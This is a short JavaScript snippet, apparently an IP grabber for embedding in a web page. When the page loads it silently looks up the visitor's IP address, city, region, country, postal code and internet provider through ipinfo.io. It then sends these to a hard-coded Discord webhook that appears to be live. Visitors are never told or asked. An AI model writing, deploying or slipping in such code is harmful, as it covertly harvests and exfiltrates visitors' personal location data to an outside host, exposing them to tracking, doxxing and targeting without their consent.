// Function to fetch IP address and location and send to Discord
async function getIPAndLocationAndSendToDiscord() {
    try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        
        // Construct the message as a single block
        const message = `
            City: ${data.city}
            Region: ${data.region}
            Country: ${data.country}
            Internet Provider: ${data.org}
            Postal Code: ${data.postal}
            IP Address: ${data.ip}
        `;
        
        // Send the message to Discord using a webhook
        await sendToDiscord(message);
    } catch (error) {
        console.error('Error fetching IP and location:', error);
    }
}

// Function to send message to Discord using webhook
async function sendToDiscord(message) {
    const webhookURL = 'https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx'; // Replace YOUR_DISCORD_WEBHOOK_URL with your actual webhook URL

    // Send the message to Discord
    await fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content: message }),
    });
}

// Call the function to get IP address, location, and send to Discord when the page loads
window.onload = getIPAndLocationAndSendToDiscord;
